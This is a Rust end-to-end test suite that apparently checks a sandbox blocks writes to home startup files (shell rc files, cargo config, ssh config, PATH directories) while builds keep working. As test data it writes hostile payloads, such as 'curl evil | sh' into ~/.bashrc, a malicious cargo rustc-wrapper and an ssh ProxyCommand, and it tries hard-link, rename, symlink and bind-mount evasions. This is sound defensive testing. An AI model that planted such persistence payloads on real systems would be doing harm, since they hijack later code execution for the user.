//! P177 E2E: a sandboxed process cannot rewrite the home-directory files that run code later,
//! outside the sandbox (shell rc files, cargo's config, `PATH` directories, ssh config), when a
//! profile makes the home writable. Reads still work, and the build caches stay writable.
//! Subprocess; kernel-enforced (Linux bwrap + Landlock, macOS Seatbelt). Soft-skips when
//! enforcement is unavailable; `SANDBOX_E2E_REQUIRE_ENFORCEMENT` hard-requires it.
// Test code: its prints reach a harness, never a user, so the workspace print deny is waived.
#![allow(clippy::print_stdout, clippy::print_stderr)]
#![cfg(all(unix, feature = "enforce"))]
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

const SCENARIO_ENV: &str = "P177_E2E_SCENARIO";
const WORKSPACE_ENV: &str = "P177_E2E_WORKSPACE";
const HOME_ENV: &str = "P177_E2E_HOME";
const REQUIRE_ENV: &str = "SANDBOX_E2E_REQUIRE_ENFORCEMENT";
const HOME_PROFILE: &str = "p177-home-writable";

/// Variables that move what the scan protects; removed so the fixture home is the only home.
const RELOCATING_ENV: &[&str] = &[
    "GIT_CONFIG_GLOBAL",
    "GIT_CONFIG_SYSTEM",
    "GIT_TEMPLATE_DIR",
    "XDG_CONFIG_HOME",
    "CARGO_HOME",
    "RUSTUP_HOME",
    "ZDOTDIR",
    "GRADLE_USER_HOME",
    "DOCKER_CONFIG",
    "NVM_DIR",
    "NPM_CONFIG_USERCONFIG",
    "npm_config_userconfig",
    "PIP_CONFIG_FILE",
    "XDG_DATA_HOME",
    "GNUPGHOME",
    "AWS_CONFIG_FILE",
    "AWS_SHARED_CREDENTIALS_FILE",
    "KUBECONFIG",
    "NETRC",
    "GH_CONFIG_DIR",
    "MYVIMRC",
    "NVIM_APPNAME",
    "YARN_RC_FILENAME",
    "BASH_ENV",
    "PYTHONSTARTUP",
    "ZSH",
    "ZSH_CUSTOM",
    "VSCODE_EXTENSIONS",
    "DIRENV_CONFIG",
    "GOPATH",
    "GOBIN",
    "DENO_INSTALL_ROOT",
    "DENO_INSTALL",
    "BUN_INSTALL",
];

struct TempDirGuard(PathBuf);
impl Drop for TempDirGuard {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn unique_temp_dir(tag: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "fuigo-p177-e2e-{tag}-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    fs::create_dir_all(&dir).expect("create temp dir");
    dunce::canonicalize(&dir).expect("canonicalize temp dir")
}

#[cfg(target_os = "linux")]
fn bwrap_available() -> bool {
    Command::new("bwrap")
        .args(["--bind", "/", "/", "--", "true"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn skip_if_enforcement_unavailable() -> bool {
    let require = std::env::var(REQUIRE_ENV).is_ok();
    let support = fuigo_sandbox::SandboxManager::support_info();
    if !support.is_supported {
        assert!(
            !require,
            "enforcement required but unsupported: {}",
            support.details
        );
        eprintln!("skipping: sandbox not supported ({})", support.details);
        return true;
    }
    #[cfg(target_os = "linux")]
    if !bwrap_available() {
        assert!(!require, "enforcement required but bwrap unavailable");
        eprintln!("skipping: bwrap not installed");
        return true;
    }
    false
}

fn is_denied(e: &std::io::Error) -> bool {
    matches!(
        e.raw_os_error(),
        Some(libc::EACCES)
            | Some(libc::EPERM)
            | Some(libc::EROFS)
            | Some(libc::EBUSY)
            | Some(libc::EXDEV)
    )
}

fn fail(msg: String) -> ! {
    eprintln!("FAIL: {msg}");
    std::process::exit(1);
}

/// Set by a permitted write the scenario must deny; reported at its end, so one run lists every
/// gap rather than the first.
static PERMITTED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

fn expect_denied(label: &str, result: std::io::Result<()>) {
    match result {
        Err(e) if is_denied(&e) => eprintln!("OK: {label} denied ({e})"),
        // Not a denial (an earlier permitted unlink leaves nothing to rename): a gap too
        Err(e) => {
            eprintln!("FAIL: {label}: unexpected error {e}");
            PERMITTED.store(true, std::sync::atomic::Ordering::SeqCst);
        }
        Ok(()) => {
            eprintln!("FAIL: {label} was permitted");
            PERMITTED.store(true, std::sync::atomic::Ordering::SeqCst);
        }
    }
}

fn expect_ok(label: &str, result: std::io::Result<()>) {
    match result {
        Ok(()) => eprintln!("OK: {label} allowed"),
        Err(e) => fail(format!("{label} should be allowed: {e}")),
    }
}

/// A home with the files the scenarios attack, a cargo registry cache and a `PATH` directory.
fn make_home(home: &Path) {
    fs::write(home.join(".bashrc"), "# user bashrc\n").unwrap();
    fs::write(home.join(".zshrc"), "# user zshrc\n").unwrap();
    fs::write(home.join(".profile"), "# user profile\n").unwrap();
    fs::create_dir_all(home.join(".cargo/registry/cache")).unwrap();
    fs::create_dir_all(home.join(".cargo/registry/index")).unwrap();
    fs::write(home.join(".cargo/config.toml"), "[build]\njobs = 2\n").unwrap();
    fs::create_dir_all(home.join(".local/bin")).unwrap();
    fs::create_dir_all(home.join(".ssh")).unwrap();
    fs::write(home.join(".ssh/config"), "Host *\n").unwrap();
}

fn run_scenario(scenario: &str, home: &Path, fuigo_home: &Path, ws: &Path) -> (bool, String) {
    let exe = std::env::current_exe().expect("current_exe");
    let mut cmd = Command::new(exe);
    cmd.env(SCENARIO_ENV, scenario)
        .env(WORKSPACE_ENV, ws)
        .env(HOME_ENV, home)
        .env("HOME", home)
        .env("FUIGO_HOME", fuigo_home)
        .args(["--ignored", "--exact", "--nocapture", "subprocess_entry"]);
    // The real toolchain, so a sandboxed `cargo build` can run with the fixture as its home
    if let Some(rustup_home) = rustup_home() {
        cmd.env(RUSTUP_HOME_ENV, rustup_home);
    }
    for name in RELOCATING_ENV {
        cmd.env_remove(name);
    }
    // No global git config in the fixture: git's own scan (P158) must not be what refuses
    cmd.env("GIT_CONFIG_GLOBAL", "/dev/null");
    let output = cmd.output().expect("spawn subprocess");
    (
        output.status.success(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
    )
}

const RUSTUP_HOME_ENV: &str = "P177_E2E_RUSTUP_HOME";

/// This process's rustup home, when `cargo` runs here at all.
fn rustup_home() -> Option<PathBuf> {
    let works = Command::new("cargo")
        .arg("--version")
        .output()
        .is_ok_and(|out| out.status.success());
    if !works {
        return None;
    }
    if let Some(home) = std::env::var_os("RUSTUP_HOME") {
        return Some(PathBuf::from(home));
    }
    let out = Command::new("rustup")
        .args(["show", "home"])
        .output()
        .ok()?;
    let text = String::from_utf8(out.stdout).ok()?;
    Some(PathBuf::from(text.trim())).filter(|path| path.is_dir())
}

/// `(home, fuigo home, workspace)`; the workspace is the home itself when `ws_is_home`. The home
/// lies in the temp directory, which every profile keeps writable.
fn fixture(tag: &str, ws_is_home: bool) -> (PathBuf, PathBuf, PathBuf, Vec<TempDirGuard>) {
    let home = unique_temp_dir(&format!("{tag}-home"));
    let fuigo = unique_temp_dir(&format!("{tag}-fuigo"));
    fs::write(
        fuigo.join(fuigo_config::SANDBOX_CONFIG_FILENAME),
        format!(
            "[profiles.{HOME_PROFILE}]\nextends = \"workspace\"\nread_write = [\"{}\"]\n",
            home.display()
        ),
    )
    .unwrap();
    let mut guards = vec![TempDirGuard(home.clone()), TempDirGuard(fuigo.clone())];
    let ws = if ws_is_home {
        home.clone()
    } else {
        let ws = unique_temp_dir(&format!("{tag}-ws"));
        guards.push(TempDirGuard(ws.clone()));
        ws
    };
    make_home(&home);
    (home, fuigo, ws, guards)
}

#[test]
#[ignore]
fn subprocess_entry() {
    let Ok(scenario) = std::env::var(SCENARIO_ENV) else {
        return;
    };
    let ws = PathBuf::from(std::env::var(WORKSPACE_ENV).unwrap());
    let home = PathBuf::from(std::env::var(HOME_ENV).unwrap());
    #[cfg(target_os = "linux")]
    if scenario == "spoof" {
        // The marker without bwrap: no read-only binds exist, so verification must refuse
        // SAFETY: single-threaded subprocess, before any other thread starts.
        unsafe { std::env::set_var("__FUIGO_INSIDE_BWRAP", "1") };
        let profile = fuigo_sandbox::ProfileName::Workspace;
        match fuigo_sandbox::verify_git_write_deny_enforced(&profile, &ws) {
            Err(e) => eprintln!("OK: spoofed bwrap refused: {e}"),
            Ok(()) => fail("spoofed bwrap passed the home write-deny verification".into()),
        }
        eprintln!("OK: p177 scenario spoof passed");
        return;
    }
    let profile = match scenario.as_str() {
        "home_in_temp" | "workspace_is_home" => fuigo_sandbox::ProfileName::Workspace,
        "home_writable" => fuigo_sandbox::ProfileName::Custom(HOME_PROFILE.to_string()),
        other => fail(format!("unknown scenario {other}")),
    };
    // Linux cannot stop a command creating a missing `~/.bash_profile` in a home the workspace or
    // a grant makes writable: the sandbox refuses to start there
    #[cfg(target_os = "linux")]
    if scenario != "home_in_temp" {
        let config = fuigo_sandbox::load_sandbox_config(&ws);
        match profile.resolve_profile(&ws, &config) {
            Err(e) if e.to_string().contains("home write-deny") => {
                eprintln!("OK: refused: {e}");
            }
            Err(e) => fail(format!("refused for another reason: {e}")),
            Ok(_) => fail("a writable home on Linux resolved".into()),
        }
        if fuigo_sandbox::bwrap_reexec_for_profile(&profile, &ws).is_some() {
            fail("the startup path re-executed into a sandbox it should refuse".into());
        }
        eprintln!("OK: p177 scenario {scenario} passed");
        return;
    }
    #[cfg(target_os = "linux")]
    if !fuigo_sandbox::is_inside_bwrap() {
        match fuigo_sandbox::bwrap_reexec_for_profile(&profile, &ws) {
            Some(mut cmd) => {
                use std::os::unix::process::CommandExt;
                let err = cmd.exec();
                fail(format!("bwrap re-exec failed: {err}"));
            }
            None => fail("bwrap_reexec_for_profile returned None outside bwrap".into()),
        }
    }
    let mut sandbox = fuigo_sandbox::SandboxManager::new(profile, &ws);
    if let Err(e) = sandbox.apply(&ws) {
        fail(format!("sandbox apply failed: {e}"));
    }
    if !sandbox.is_applied() {
        fail("sandbox was not applied".into());
    }
    // As fuigo-shell does after apply: every required bind is in place, and a missing entry
    // Linux leaves unbound (a file, a tool tree) is not required
    #[cfg(target_os = "linux")]
    if let Err(e) = fuigo_sandbox::verify_hook_write_deny_enforced()
        .and_then(|()| fuigo_sandbox::verify_git_write_deny_enforced(sandbox.profile(), &ws))
    {
        fail(format!("write-deny verification after apply failed: {e}"));
    }
    home_scenario(&home, &ws);
    cargo_build(&home, &ws);
    if PERMITTED.load(std::sync::atomic::Ordering::SeqCst) {
        fail(format!(
            "p177 scenario {scenario}: a protected write was permitted"
        ));
    }
    eprintln!("OK: p177 scenario {scenario} passed");
}

fn home_scenario(home: &Path, ws: &Path) {
    match fs::read_to_string(home.join(".bashrc")) {
        Ok(text) if text.contains("user bashrc") => eprintln!("OK: ~/.bashrc readable"),
        other => fail(format!("~/.bashrc must stay readable: {other:?}")),
    }
    match fs::read_to_string(home.join(".cargo/config.toml")) {
        Ok(text) if text.contains("jobs") => eprintln!("OK: ~/.cargo/config.toml readable"),
        other => fail(format!(
            "~/.cargo/config.toml must stay readable: {other:?}"
        )),
    }
    expect_denied(
        "rewrite ~/.bashrc",
        fs::write(home.join(".bashrc"), "curl evil | sh\n"),
    );
    expect_denied("unlink ~/.bashrc", fs::remove_file(home.join(".bashrc")));
    expect_denied(
        "rename ~/.bashrc",
        fs::rename(home.join(".bashrc"), home.join("bashrc.moved")),
    );
    expect_denied("rewrite ~/.zshrc", fs::write(home.join(".zshrc"), "evil\n"));
    expect_denied(
        "rewrite ~/.profile",
        fs::write(home.join(".profile"), "evil\n"),
    );
    expect_denied(
        "rewrite ~/.cargo/config.toml",
        fs::write(
            home.join(".cargo/config.toml"),
            "[target.x86_64-unknown-linux-gnu]\nlinker = \"/tmp/evil\"\n",
        ),
    );
    // Astra r1 #1: cargo reads `config` before `config.toml`; it must not be creatable either
    expect_denied(
        "create ~/.cargo/config",
        fs::write(
            home.join(".cargo/config"),
            "[build]\nrustc-wrapper = \"/tmp/evil\"\n",
        ),
    );
    expect_denied(
        "create ~/.cargo/env",
        fs::write(home.join(".cargo/env"), "evil\n"),
    );
    expect_denied(
        "plant ~/.local/bin/ls",
        fs::write(home.join(".local/bin/ls"), "#!/bin/sh\nevil\n"),
    );
    expect_denied(
        "rewrite ~/.ssh/config",
        fs::write(home.join(".ssh/config"), "Host *\n  ProxyCommand evil\n"),
    );
    expect_denied("plant ~/.ssh/rc", fs::write(home.join(".ssh/rc"), "evil\n"));
    expect_denied(
        "plant ~/.config/autostart/x.desktop",
        fs::create_dir_all(home.join(".config/autostart"))
            .and_then(|()| fs::write(home.join(".config/autostart/x.desktop"), "Exec=evil\n")),
    );
    // Grok HIGH 1 / MEDIUM 4: a hard link of a protected file into a writable place, written
    // through, must not reach the protected inode. Linux: each bind is its own mount, so link(2)
    // fails with EXDEV (Landlock is not what stops it); macOS: `file-link` is denied
    let bashrc = home.join(".bashrc");
    let cargo_config = home.join(".cargo/config.toml");
    for (label, source, alias) in [
        (
            "hard-link ~/.cargo/config.toml into the cargo registry and write it",
            &cargo_config,
            home.join(".cargo/registry/alias"),
        ),
        (
            "hard-link ~/.cargo/config.toml into the home and write it",
            &cargo_config,
            home.join("cargo-alias"),
        ),
        (
            "hard-link ~/.cargo/config.toml into the workspace and write it",
            &cargo_config,
            ws.join("cargo-alias"),
        ),
        (
            "hard-link ~/.bashrc into the workspace and write it",
            &bashrc,
            ws.join("bashrc-alias"),
        ),
        (
            "hard-link ~/.bashrc into the home and write it",
            &bashrc,
            home.join("bashrc-alias"),
        ),
    ] {
        expect_denied(
            label,
            fs::hard_link(source, &alias)
                .and_then(|()| fs::write(&alias, "[build]\nrustc-wrapper = \"/tmp/evil\"\n")),
        );
    }
    // macOS denies a missing startup name anywhere; on Linux a home under the temp directory
    // keeps that one creatable (accepted limit, module doc of `home_write_deny`)
    #[cfg(target_os = "macos")]
    expect_denied(
        "create ~/.bash_profile",
        fs::write(home.join(".bash_profile"), "evil\n"),
    );
    // A build still works: its caches and its target directory stay writable
    expect_ok(
        "write the cargo registry cache",
        fs::write(home.join(".cargo/registry/cache/probe.crate"), "x"),
    );
    expect_ok(
        "mkdir in the cargo registry index",
        fs::create_dir_all(home.join(".cargo/registry/index/probe")),
    );
    expect_ok(
        "write cargo's package-cache lock",
        fs::write(home.join(".cargo/.package-cache"), ""),
    );
    expect_ok(
        "write the workspace target dir",
        fs::create_dir_all(ws.join("target/debug"))
            .and_then(|()| fs::write(ws.join("target/debug/probe"), "x")),
    );
    expect_ok(
        "write other home file",
        fs::write(home.join("notes.txt"), "x"),
    );
    relocation_scenario(home, ws);
}

/// Every way to change a protected home path without writing to it: rename a decoy over it, move
/// it out, move it or one of its parents away (then re-create the name unprotected), swap it for a
/// symlink, mount over it. Linux: each pin is a bind mount (EBUSY/EXDEV) and Landlock withholds
/// `Refer`/removal outside the write roots; macOS: the `file-write-unlink`/`-create`/`file-link`
/// node denies. Run last, as a permitted move would break the fixture for the checks after it.
fn relocation_scenario(home: &Path, ws: &Path) {
    use std::os::unix::fs::symlink;
    fs::write(home.join("decoy"), "evil\n").unwrap();
    fs::write(ws.join("decoy"), "evil\n").unwrap();
    fs::create_dir_all(home.join("decoy-dir")).unwrap();
    fs::create_dir_all(ws.join("decoy-dir")).unwrap();
    let bashrc = home.join(".bashrc");
    let cargo = home.join(".cargo");
    let cargo_config = cargo.join("config.toml");
    // rename in: a decoy over a protected file (same directory, then the workspace)
    expect_denied(
        "rename a home decoy over ~/.bashrc",
        fs::rename(home.join("decoy"), &bashrc),
    );
    expect_denied(
        "rename a workspace decoy over ~/.bashrc",
        fs::rename(ws.join("decoy"), &bashrc),
    );
    expect_denied(
        "rename a decoy over ~/.cargo/config.toml",
        fs::rename(ws.join("decoy"), &cargo_config),
    );
    // rename a decoy directory over a protected tree
    expect_denied(
        "rename a decoy dir over ~/.ssh",
        fs::rename(home.join("decoy-dir"), home.join(".ssh")),
    );
    expect_denied(
        "rename a decoy dir over ~/.local/bin",
        fs::rename(ws.join("decoy-dir"), home.join(".local/bin")),
    );
    // rename out: a protected file into a writable sibling, the home and the workspace
    expect_denied(
        "rename ~/.cargo/config.toml into the registry",
        fs::rename(&cargo_config, cargo.join("registry/cfg")),
    );
    expect_denied(
        "rename ~/.cargo/config.toml into the workspace",
        fs::rename(&cargo_config, ws.join("cfg")),
    );
    expect_denied(
        "rename ~/.ssh/config into the home",
        fs::rename(home.join(".ssh/config"), home.join("ssh-config")),
    );
    // move a protected tree, then a parent of one, away (the name could then be re-created)
    for (label, from) in [
        ("~/.cargo", cargo.clone()),
        ("~/.ssh", home.join(".ssh")),
        ("~/.local/bin", home.join(".local/bin")),
        ("~/.local (parent of a pinned tree)", home.join(".local")),
    ] {
        let to = home.join("moved-away");
        expect_denied(
            &format!("move {label} away"),
            fs::rename(&from, &to).inspect(|()| {
                let _ = fs::rename(&to, &from);
            }),
        );
    }
    expect_denied(
        "move ~/.cargo into the workspace",
        fs::rename(&cargo, ws.join("moved-cargo")),
    );
    // symlink swaps: a new name that points at a writable file, a symlink over a protected name
    expect_denied(
        "symlink ~/.cargo/config -> workspace file",
        symlink(ws.join("decoy"), cargo.join("config")),
    );
    // (a symlink over an existing protected name is EEXIST: replacing it needs unlink or rename,
    // both denied above)
    expect_denied(
        "symlink ~/.local/bin/ls -> workspace file",
        symlink(ws.join("decoy"), home.join(".local/bin/ls")),
    );
    // remove a protected tree's contents, then the tree
    expect_denied(
        "remove ~/.ssh/config",
        fs::remove_file(home.join(".ssh/config")),
    );
    expect_denied("remove ~/.ssh", fs::remove_dir(home.join(".ssh")));
    // mount over a protected path (a bind mount of a writable directory): the sandbox cannot mount
    #[cfg(target_os = "linux")]
    {
        let bind = |target: &Path| {
            let src = std::ffi::CString::new(ws.to_str().unwrap()).unwrap();
            let dst = std::ffi::CString::new(target.to_str().unwrap()).unwrap();
            // SAFETY: valid NUL-terminated strings; a failing call changes nothing
            let r = unsafe {
                libc::mount(
                    src.as_ptr(),
                    dst.as_ptr(),
                    std::ptr::null(),
                    libc::MS_BIND,
                    std::ptr::null(),
                )
            };
            if r == 0 {
                Ok(())
            } else {
                Err(std::io::Error::last_os_error())
            }
        };
        expect_denied("bind-mount a workspace over ~/.cargo", bind(&cargo));
        expect_denied(
            "bind-mount a workspace over ~/.ssh",
            bind(&home.join(".ssh")),
        );
    }
}

/// A real `cargo build` inside the sandbox, with the fixture's `~/.cargo` as its home: it reads
/// the protected config, takes the package-cache lock and writes `target/`.
fn cargo_build(home: &Path, ws: &Path) {
    let Some(rustup_home) = std::env::var_os(RUSTUP_HOME_ENV) else {
        eprintln!("SKIP: cargo is not runnable here; the build check did not run");
        return;
    };
    let krate = ws.join("probe-crate");
    let made = fs::create_dir_all(krate.join("src"))
        .and_then(|()| {
            fs::write(
                krate.join("Cargo.toml"),
                "[package]\nname = \"probe\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[workspace]\n",
            )
        })
        .and_then(|()| fs::write(krate.join("src/main.rs"), "fn main() {}\n"));
    expect_ok("write a crate in the workspace", made);
    let out = Command::new("cargo")
        .args(["build", "--offline", "--quiet"])
        .current_dir(&krate)
        .env("CARGO_HOME", home.join(".cargo"))
        .env("RUSTUP_HOME", rustup_home)
        .env("CARGO_TARGET_DIR", ws.join("probe-target"))
        .output();
    match out {
        Ok(out) if out.status.success() => eprintln!("OK: cargo build in the sandbox"),
        Ok(out) => fail(format!(
            "cargo build failed in the sandbox: {}",
            String::from_utf8_lossy(&out.stderr)
        )),
        Err(e) => fail(format!("cargo did not start in the sandbox: {e}")),
    }
    if !ws.join("probe-target/debug/probe").exists() {
        fail("cargo build wrote no binary".into());
    }
}

fn assert_untouched(home: &Path, stderr: &str) {
    let bashrc = fs::read_to_string(home.join(".bashrc")).unwrap_or_default();
    assert!(
        bashrc.contains("user bashrc") && !bashrc.contains("evil"),
        "~/.bashrc was rewritten: {bashrc}\nstderr: {stderr}"
    );
    let cargo = fs::read_to_string(home.join(".cargo/config.toml")).unwrap_or_default();
    assert!(
        !cargo.contains("evil"),
        "~/.cargo/config.toml was rewritten: {cargo}\nstderr: {stderr}"
    );
    assert!(
        !home.join(".cargo/config").exists(),
        "~/.cargo/config was created\nstderr: {stderr}"
    );
    assert!(
        !home.join(".local/bin/ls").exists(),
        "~/.local/bin/ls was planted\nstderr: {stderr}"
    );
}

fn run_and_check(scenario: &str, tag: &str, ws_is_home: bool) {
    let (home, fuigo, ws, _guards) = fixture(tag, ws_is_home);
    let (ok, stderr) = run_scenario(scenario, &home, &fuigo, &ws);
    // The sandboxed side's report, kept in the log under `--nocapture` (every denial and its errno)
    eprintln!("--- p177 scenario {scenario} ---\n{stderr}");
    assert!(ok, "{scenario} scenario failed\nstderr: {stderr}");
    assert!(
        stderr.contains(&format!("OK: p177 scenario {scenario} passed")),
        "missing pass marker\nstderr: {stderr}"
    );
    assert_untouched(&home, &stderr);
    // The build ran wherever cargo runs at all (a skip is printed, never silent)
    if scenario == "home_in_temp" && rustup_home().is_some() {
        assert!(
            stderr.contains("OK: cargo build in the sandbox"),
            "the sandboxed cargo build did not run\nstderr: {stderr}"
        );
    }
}

/// The workspace profile with a home under the temp directory (writable in every profile): the
/// home's startup files stay write-denied, and a build still works.
#[test]
fn p177_home_startup_files_are_write_denied_when_home_is_in_a_writable_root() {
    if skip_if_enforcement_unavailable() {
        return;
    }
    run_and_check("home_in_temp", "intemp", false);
}

/// A custom profile that grants the home: write-denied on macOS; on Linux the sandbox refuses to
/// start (a missing startup file would be creatable).
#[test]
fn p177_home_startup_files_are_write_denied_when_home_is_writable() {
    if skip_if_enforcement_unavailable() {
        return;
    }
    run_and_check("home_writable", "granted", false);
}

/// The workspace profile run in the home itself: as a home grant.
#[test]
fn p177_home_startup_files_are_write_denied_when_the_workspace_is_home() {
    if skip_if_enforcement_unavailable() {
        return;
    }
    run_and_check("workspace_is_home", "wshome", true);
}

/// A forged `__FUIGO_INSIDE_BWRAP` marker (no read-only binds) fails the verification for a
/// home file alone: no repository and no global git config in the fixture.
#[cfg(target_os = "linux")]
#[test]
fn p177_spoofed_bwrap_marker_fails_home_verification() {
    if skip_if_enforcement_unavailable() {
        return;
    }
    let (home, fuigo, ws, _guards) = fixture("spoof", false);
    let (ok, stderr) = run_scenario("spoof", &home, &fuigo, &ws);
    assert!(ok, "spoof scenario failed\nstderr: {stderr}");
    assert!(
        stderr.contains("OK: spoofed bwrap refused"),
        "missing refusal\nstderr: {stderr}"
    );
}
